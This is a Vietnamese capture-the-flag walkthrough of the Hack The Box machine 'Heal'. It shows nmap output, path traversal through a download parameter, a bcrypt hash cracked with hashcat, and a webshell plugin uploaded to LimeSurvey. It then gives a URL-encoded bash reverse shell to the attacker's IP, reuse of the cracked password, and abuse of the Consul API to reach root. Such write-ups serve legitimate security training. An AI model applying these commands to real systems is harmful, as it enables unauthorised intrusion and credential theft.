# Heal

<img width="1450" height="443" alt="image" src="https://github.com/user-attachments/assets/cedabe6c-d8c9-485f-a970-0892caf37859" />

Sử dụng nmap đối với target thì có xuất hiện 2 port gồm 22 và 80:

```
sudo nmap 10.129.6.53 -Pn -sV -sC -p- --min-rate=200 -T 4 -oN mediumlab -v
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
|_  256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Heal
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 800D9D6AD40E40173F19D5EE9752AC18
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Truy cập thông qua browser thì xuất hiện giao diện như này:

<img width="1909" height="924" alt="image" src="https://github.com/user-attachments/assets/e6dfe311-025e-4da0-9500-a835fd99b8af" />

Tôi tìm được thêm 2 subdomain là `api.heal.htb` và `take-survey.heal.htb`:

<img width="700" height="358" alt="image" src="https://github.com/user-attachments/assets/fe2d3870-1f65-4941-a6a8-2153dbb6acab" />

Sau khi login thì có xuất hiện cái này, gồm điền form gửi đi và export tải về máy:

<img width="1906" height="962" alt="image" src="https://github.com/user-attachments/assets/9b6d5c68-76e7-480e-ae03-442ea8f0cb6e" />

Ở `/download?filename=f77ef1fb0a52e447ba3b.pdf` có param filename nhận tên file và trả về file đó:

<img width="1907" height="910" alt="image" src="https://github.com/user-attachments/assets/a28d62ae-6427-4bd0-a9d6-81399803499f" />

Tôi thử path traversal và nó được:

<img width="1913" height="825" alt="image" src="https://github.com/user-attachments/assets/9762d213-02a9-4d33-9983-400f45eedc1b" />

Tôi dựng lại docker trên máy của tôi và thấy file `database.yml`:

<img width="1099" height="847" alt="image" src="https://github.com/user-attachments/assets/eb49ae8e-b6fd-41d2-9a4b-2e068f6c1a0d" />

<img width="941" height="1017" alt="image" src="https://github.com/user-attachments/assets/b89c4935-3616-4ae9-a38f-292fc70ebc09" />

Tôi lấy được mật khẩu của `ralph` là `$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG`:

<img width="944" height="991" alt="image" src="https://github.com/user-attachments/assets/6291b4c0-3466-4ae5-86c3-e708d165b3fa" />

```
hashcat -m 3200 ~/hashcat/target.txt ~/wordlist/rockyou.txt
password: 147258369
```

Lúc này thì login được vào `take-survey.heal.htb` với role là admin:

<img width="1909" height="1021" alt="image" src="https://github.com/user-attachments/assets/f0bb707a-f661-4dfd-af2e-a2ac64669ade" />

Sau 1 lúc ngồi mò thì tôi tìm được cái plugin có thể upload thêm vào, từ đây có thể chèn được thêm webshell thông qua [plugin](https://github.com/namdt5125/road_to_hecker/blob/main/Heal/pwn_plugin.zip):

<img width="1912" height="808" alt="image" src="https://github.com/user-attachments/assets/671456e5-c221-4fda-898e-20b714962078" />

Sau khi cài xong plugin thì nó xuất hiện ở đây:

<img width="1911" height="249" alt="image" src="https://github.com/user-attachments/assets/dc8e0d69-4ccd-4933-bcc0-40faad8c5f2b" />

Truy cập vào đây để kích hoạt webshell `http://take-survey.heal.htb/upload/plugins/PwnPlugin/shell.php?cmd=id`:

<img width="713" height="158" alt="image" src="https://github.com/user-attachments/assets/aa373a50-10f3-4912-940e-de94688e5155" />

Chạy reverse shell 

```
http://take-survey.heal.htb/upload/plugins/PwnPlugin/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.21%2F4444%200%3E%261%27
```

<img width="857" height="981" alt="image" src="https://github.com/user-attachments/assets/55b0e2c1-791d-4843-a34c-5f9778c97be8" />

Tôi tìm được mật khẩu tại file config.php, sau đó truy cập vào database nhưng không kiếm được gì hữu ích:

<img width="1429" height="909" alt="image" src="https://github.com/user-attachments/assets/6efd248f-03fe-4f3a-b23a-b60ad4f21ac4" />

Ở đây là 2 user là `ron` và `ralph`, tôi thử pass thì được là `ron:AdmiDi0_pA$$w0rd`:

<img width="560" height="122" alt="image" src="https://github.com/user-attachments/assets/d6e711b8-707e-4db2-a964-255b66c95dd6" />

Dùng `ps auxww` và `ss -tulnp` thì tôi thấy có 1 dịch vụ consul đang chạy, tôi thử làm 1 cái trên vmware để xem như nào:

<img width="1877" height="742" alt="image" src="https://github.com/user-attachments/assets/d6c884dc-4b1c-4e18-886a-864ea0608730" />

Tôi dùng `ssh -L 8500:127.0.0.1:8500 ron@10.129.6.53` để nối vào 8500, truy cập vào consul:

<img width="1895" height="955" alt="image" src="https://github.com/user-attachments/assets/c06b6b54-e3b5-40e1-8ef4-bc09638e604c" />

Sau khi tìm hiểu thì api để add thêm service là `http://localhost:8500/v1/agent/check/register`, tôi add thêm service vào:

```
curl --request PUT \
  --url http://localhost:8500/v1/agent/check/register \
  --data '{
    "ID": "test",
    "Name": "test",
    "Notes": "hehe",
    "DeregisterCriticalServiceAfter": "90m",
    "Args": ["/usr/bin/cat","root/root.txt"],
    "Interval": "10s",
    "Timeout": "5s"
  }'
```

<img width="1730" height="1035" alt="image" src="https://github.com/user-attachments/assets/5856ef9b-8000-458f-83b9-3691195e5ad2" />








